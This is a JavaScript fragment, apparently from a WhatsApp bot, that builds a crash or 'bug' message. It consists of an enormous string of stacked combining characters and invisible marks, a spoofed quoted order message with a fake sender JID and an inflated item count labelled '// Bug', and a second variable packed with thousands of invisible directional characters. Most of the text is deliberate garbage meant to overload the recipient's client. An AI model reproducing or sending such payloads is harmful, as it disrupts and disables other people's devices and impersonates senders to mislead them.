̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ̷',
    orderTitle: 'fake', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})

wew = fs.readFileSync(`./hm/vvirgamv2.jpeg`)
lzain = `
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎